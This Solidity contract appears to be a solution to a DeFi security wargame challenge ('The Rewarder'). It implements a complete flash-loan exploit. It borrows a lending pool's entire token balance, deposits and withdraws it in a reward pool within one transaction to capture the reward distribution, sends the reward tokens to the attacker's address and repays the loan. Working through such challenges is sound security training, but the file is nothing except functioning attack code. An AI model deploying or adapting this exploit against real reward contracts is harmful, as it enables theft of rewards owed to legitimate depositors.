// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TheRewarderAttacker {
    address public owner;

    FlashLoanerPool private _flashloanerPool;
    TheRewarderPool private _rewarderPool;
    IERC20 private _liquidityToken;
    IERC20 private _rewardToken;

    constructor(FlashLoanerPool flashloanerPool, TheRewarderPool rewarderPool, IERC20 liquidityToken, IERC20 rewardToken) {
        owner = msg.sender;

        _flashloanerPool = flashloanerPool;
        _rewarderPool = rewarderPool;
        _liquidityToken = liquidityToken;
        _rewardToken = rewardToken;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner");
        _;
    }

    function attack() external onlyOwner {
        uint256 tokenAmount = _liquidityToken.balanceOf(address(_flashloanerPool));
        _flashloanerPool.flashLoan(tokenAmount);
    }

    function receiveFlashLoan(uint256 amount) external {
        _liquidityToken.approve(address(_rewarderPool), amount);
        _rewarderPool.deposit(amount);
        _rewarderPool.withdraw(amount);

        _rewardToken.transfer(owner, _rewardToken.balanceOf(address(this)));

        bool success = _liquidityToken.transfer(address(_flashloanerPool), amount);
        require(success);
    }
}
